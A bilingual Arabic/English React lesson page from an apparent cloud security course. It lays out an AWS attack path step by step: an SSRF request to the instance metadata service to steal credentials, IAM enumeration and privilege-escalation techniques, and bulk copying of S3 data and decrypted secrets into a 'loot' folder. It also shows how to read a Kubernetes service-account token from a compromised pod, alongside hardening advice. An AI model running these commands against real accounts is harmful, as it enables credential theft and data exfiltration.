"use client";
import { LessonShell, Section, Callout, Code, Step, Analogy, TwoCol, Card, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="cloud">
      <L
        ar={<>
          <Section title="لماذا السحابة هدف رقم واحد اليوم؟">
            <Analogy>السحابة مثل برج فيه ألف مكتب، لكن صاحب كل مكتب يضع قفله بنفسه. لو وضع شخص قفلاً ضعيفاً، يمكن للص دخول مكتبه بدون أن يلاحظ أحد، و من هناك يصل لأبواب داخلية للبرج كله. <b>أكثر من 80% من اختراقات السحابة سببها سوء تكوين</b> لا ثغرة برمجية.</Analogy>
          </Section>
          <Section title="نموذج المسؤولية المشتركة">
            <p><b>Cloud Provider</b> مسؤول عن <i>أمن السحابة</i> (الأجهزة، الـ hypervisor). <b>أنت</b> مسؤول عن <i>الأمن في السحابة</i> (الـ IAM، التكوين، البيانات).</p>
          </Section>
          <Section title="AWS Attack Path — مسار هجوم نموذجي">
            <Step n={1} title="جمع المعلومات">
              <Code lang="bash">{`aws s3 ls s3://target-backups --no-sign-request
amass enum -d target.gov -src
crt.sh → *.elb.amazonaws.com baring target name`}</Code>
            </Step>
            <Step n={2} title="مفاتيح مسرّبة من GitHub">
              <Code lang="bash">{`gitleaks detect --source=. --report-format=json
trufflehog github --org=target --only-verified
aws sts get-caller-identity --profile leaked`}</Code>
            </Step>
            <Step n={3} title="استغلال SSRF للوصول إلى IMDS">
              <Code lang="payload">{`GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
{"AccessKeyId":"ASIA...","SecretAccessKey":"abc...","Token":"FQoG..."}`}</Code>
              <Callout kind="danger" title="الفرق بين IMDSv1 و v2">IMDSv2 يتطلب توكن PUT و يمنع SSRF الكلاسيكي. <b>فعّله إجبارياً (HttpTokens=required)</b>.</Callout>
            </Step>
            <Step n={4} title="تعداد صلاحيات الـ IAM">
              <Code lang="bash">{`aws sts get-caller-identity
aws iam list-user-policies --user-name $U
aws iam simulate-principal-policy --policy-source-arn ... --action-names "*"
pacu
cloudfox aws inventory --profile pwned
enumerate-iam --access-key ... --secret-key ...`}</Code>
            </Step>
            <Step n={5} title="رفع الصلاحيات — Privilege Escalation">
              <ul>
                <li>iam:CreateAccessKey على مستخدم آخر.</li>
                <li>iam:AttachUserPolicy → ضمّ AdministratorAccess.</li>
                <li>iam:PassRole + ec2:RunInstances = إنشاء EC2 بدور أعلى.</li>
                <li>lambda:UpdateFunctionCode على Lambda بدور أعلى.</li>
                <li>sts:AssumeRole مع trust policy سيء.</li>
              </ul>
            </Step>
            <Step n={6} title="حصاد البيانات">
              <Code lang="bash">{`aws s3 sync s3://target-backups ./loot/
aws rds describe-db-snapshots
aws secretsmanager list-secrets
aws ssm get-parameters-by-path --path /prod --with-decryption`}</Code>
            </Step>
          </Section>
          <Section title="الأخطاء الأكثر شيوعاً في AWS">
            <TwoCol>
              <Card title="S3 Public Buckets" color="red">aws s3api put-bucket-acl --acl public-read = كارثة. استخدم Block Public Access على مستوى الحساب.</Card>
              <Card title="Wildcard في IAM" color="red">"Action":"*","Resource":"*" = صلاحية كاملة. استخدم Access Analyzer لكشفها.</Card>
              <Card title="Security Groups مفتوحة" color="red">0.0.0.0/0:22 أو :3389 = هدف لـ brute force. استخدم SSM Session Manager بدل SSH.</Card>
              <Card title="CloudTrail مغلق" color="red">بدون CloudTrail + GuardDuty لن تعرف أنه تم اختراقك.</Card>
            </TwoCol>
          </Section>
          <Section title="Azure / GCP بإيجاز">
            <h3>Azure</h3>
            <ul>
              <li>هجمات على Entra ID (Azure AD) — device code phishing, illicit consent.</li>
              <li>أدوات: ROADtools, AADInternals, MicroBurst.</li>
              <li>Managed Identity = نسخة IMDS في Azure (169.254.169.254).</li>
            </ul>
            <h3>GCP</h3>
            <ul>
              <li>Service Accounts = أكبر سطح هجوم.</li>
              <li>iam.serviceAccountTokenCreator + actAs = privesc.</li>
              <li>أدوات: GCPBucketBrute, gcloud-pwn, hayat.</li>
            </ul>
          </Section>
          <Section title="Kubernetes — السحابة داخل السحابة">
            <ul>
              <li>kubelet مفتوح بدون authn؟ كارثة.</li>
              <li>RBAC فيه cluster-admin لكل ServiceAccount.</li>
              <li>صور حاويات بثغرات (trivy لفحصها).</li>
              <li>الـ pod بـ privileged: true = خروج إلى الـ node.</li>
            </ul>
            <Code lang="kubectl from inside compromised pod">{`cat /var/run/secrets/kubernetes.io/serviceaccount/token
kubectl auth can-i --list
peirates`}</Code>
          </Section>
          <Section title="الدفاع السحابي — Cloud Hardening">
            <ol>
              <li><b>CSPM</b> (Prisma Cloud, Wiz, AWS Security Hub) لكشف سوء التكوين تلقائياً.</li>
              <li><b>CIEM</b> لتحليل صلاحيات IAM الزائدة.</li>
              <li><b>SCPs</b> لمنع أفعال خطيرة على مستوى المؤسسة.</li>
              <li>CloudTrail + GuardDuty + Detective.</li>
              <li>تطبيق AWS Foundational Security Best Practices + CIS AWS Benchmark.</li>
              <li>IMDSv2 إجبارياً + إيقاف public IP افتراضياً.</li>
              <li>تشفير كل EBS, S3, RDS بـ KMS + تفعيل MFA Delete.</li>
              <li>Just-In-Time access عبر AWS SSO / PIM.</li>
            </ol>
            <Callout kind="good" title="حسبة سريعة">تقليل صلاحيات IAM إلى least privilege يوقف 90% من مسارات privesc المعروفة.</Callout>
          </Section>
        </>}
        en={<>
          <Section title="Why is the cloud target #1 today?">
            <Analogy>The cloud is like a tower with a thousand offices, but each tenant installs their own lock. If anyone uses a weak lock, a thief slips into their office unnoticed and from there reaches internal doors of the whole tower. <b>Over 80% of cloud breaches are misconfigurations</b>, not zero-days.</Analogy>
          </Section>
          <Section title="The shared responsibility model">
            <p>The <b>cloud provider</b> is responsible for <i>security OF the cloud</i> (hardware, hypervisor). <b>You</b> are responsible for <i>security IN the cloud</i> (IAM, configuration, data).</p>
          </Section>
          <Section title="AWS attack path — a typical chain">
            <Step n={1} title="Information gathering">
              <Code lang="bash">{`aws s3 ls s3://target-backups --no-sign-request
amass enum -d target.gov -src
crt.sh → *.elb.amazonaws.com baring target name`}</Code>
            </Step>
            <Step n={2} title="Leaked keys from GitHub">
              <Code lang="bash">{`gitleaks detect --source=. --report-format=json
trufflehog github --org=target --only-verified
aws sts get-caller-identity --profile leaked`}</Code>
            </Step>
            <Step n={3} title="Use SSRF to hit IMDS">
              <Code lang="payload">{`GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
{"AccessKeyId":"ASIA...","SecretAccessKey":"abc...","Token":"FQoG..."}`}</Code>
              <Callout kind="danger" title="IMDSv1 vs v2">IMDSv2 requires a PUT token and blocks classic SSRF. <b>Enforce it (HttpTokens=required)</b>.</Callout>
            </Step>
            <Step n={4} title="Enumerate IAM permissions">
              <Code lang="bash">{`aws sts get-caller-identity
aws iam list-user-policies --user-name $U
aws iam simulate-principal-policy --policy-source-arn ... --action-names "*"
pacu
cloudfox aws inventory --profile pwned
enumerate-iam --access-key ... --secret-key ...`}</Code>
            </Step>
            <Step n={5} title="Privilege escalation">
              <ul>
                <li>iam:CreateAccessKey on another user.</li>
                <li>iam:AttachUserPolicy → attach AdministratorAccess.</li>
                <li>iam:PassRole + ec2:RunInstances = launch EC2 with a higher role.</li>
                <li>lambda:UpdateFunctionCode on a Lambda with a higher role.</li>
                <li>sts:AssumeRole with a sloppy trust policy.</li>
              </ul>
            </Step>
            <Step n={6} title="Data harvesting">
              <Code lang="bash">{`aws s3 sync s3://target-backups ./loot/
aws rds describe-db-snapshots
aws secretsmanager list-secrets
aws ssm get-parameters-by-path --path /prod --with-decryption`}</Code>
            </Step>
          </Section>
          <Section title="The most common AWS mistakes">
            <TwoCol>
              <Card title="Public S3 buckets" color="red">aws s3api put-bucket-acl --acl public-read = disaster. Enable account-level Block Public Access.</Card>
              <Card title="IAM wildcards" color="red">"Action":"*","Resource":"*" = full power. Use Access Analyzer to surface them.</Card>
              <Card title="Open security groups" color="red">0.0.0.0/0:22 or :3389 invites brute force. Use SSM Session Manager instead of SSH.</Card>
              <Card title="CloudTrail off" color="red">Without CloudTrail + GuardDuty, you won't know you've been breached.</Card>
            </TwoCol>
          </Section>
          <Section title="Azure / GCP in brief">
            <h3>Azure</h3>
            <ul>
              <li>Attacks on Entra ID (Azure AD) — device code phishing, illicit consent.</li>
              <li>Tools: ROADtools, AADInternals, MicroBurst.</li>
              <li>Managed Identity = Azure's IMDS equivalent (169.254.169.254).</li>
            </ul>
            <h3>GCP</h3>
            <ul>
              <li>Service Accounts = the largest attack surface.</li>
              <li>iam.serviceAccountTokenCreator + actAs = privesc path.</li>
              <li>Tools: GCPBucketBrute, gcloud-pwn, hayat.</li>
            </ul>
          </Section>
          <Section title="Kubernetes — cloud inside the cloud">
            <ul>
              <li>kubelet exposed with no authn? Disaster.</li>
              <li>RBAC granting cluster-admin to every ServiceAccount.</li>
              <li>Container images full of CVEs (scan with trivy).</li>
              <li>A pod with privileged: true = breakout to the node.</li>
            </ul>
            <Code lang="kubectl from inside a compromised pod">{`cat /var/run/secrets/kubernetes.io/serviceaccount/token
kubectl auth can-i --list
peirates`}</Code>
          </Section>
          <Section title="Cloud hardening — defense">
            <ol>
              <li><b>CSPM</b> (Prisma Cloud, Wiz, AWS Security Hub) for automated misconfig detection.</li>
              <li><b>CIEM</b> to analyze excess IAM permissions.</li>
              <li><b>SCPs</b> to forbid dangerous actions org-wide.</li>
              <li>CloudTrail + GuardDuty + Detective.</li>
              <li>Apply AWS Foundational Security Best Practices + the CIS AWS Benchmark.</li>
              <li>Enforce IMDSv2 + disable public IP by default.</li>
              <li>Encrypt every EBS, S3, RDS with KMS + enable MFA Delete.</li>
              <li>Just-In-Time access via AWS SSO / Azure PIM.</li>
            </ol>
            <Callout kind="good" title="Quick math">Reducing IAM down to least privilege blocks 90% of known privesc paths.</Callout>
          </Section>
        </>}
      />
    </LessonShell>
  );
}
